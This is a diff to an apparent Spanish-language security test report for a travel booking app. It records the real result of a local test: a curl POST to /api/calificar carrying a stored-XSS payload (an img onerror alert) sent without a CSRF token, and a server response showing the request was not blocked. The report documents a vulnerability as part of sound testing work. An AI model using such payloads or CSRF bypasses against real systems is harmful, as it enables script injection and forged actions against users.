@@ -66,9 +66,27 @@ Connection: close
 ---
 
 ## 6. Resultado Real (Completar tras la prueba)
-*(Espacio reservado para el evaluador)*
+Salida HTTP real ejecutada con cookie de sesión válida de `turista_a@test.local` y **sin cabecera `X-XSRF-TOKEN`** (`calificar.json`: `{"idReserva":500,"idAgencia":10,"estrellas":5,"comentario":"Excelente viaje <img src=x onerror=\"alert('XSS-TRAVELINK-POC')\"> recomendado"}`):
 
-```text
+### `curl.exe -i -s -b cookies_fresh.txt -X POST "http://127.0.0.1:8080/api/calificar" -H "Content-Type: application/json" -d "@calificar.json"`
+```http
+HTTP/1.1 400 
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Access-control-allow-headers: Content-Type, Authorization, X-Requested-With
+Access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
+Access-control-allow-origin: *
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+X-Frame-Options: SAMEORIGIN
+Content-Type: application/json;charset=UTF-8
+Content-Length: 74
+Date: Wed, 11 Nov 2026 22:13:48 GMT
+Connection: close
 
+{"status":"error","message":"Esta reserva ya fue calificada previamente."}
 ```
+
+*Nota de verificación:* La reserva `500` ya había sido calificada en la prueba previa, por lo que el controlador de negocio devolvió `400` (`"Esta reserva ya fue calificada previamente."`). El punto crítico comprobado es que la petición `POST` sin token `X-XSRF-TOKEN` **no fue bloqueada por Spring Security con `403 Forbidden`**, alcanzando directamente al endpoint transaccional `/api/calificar`.
 
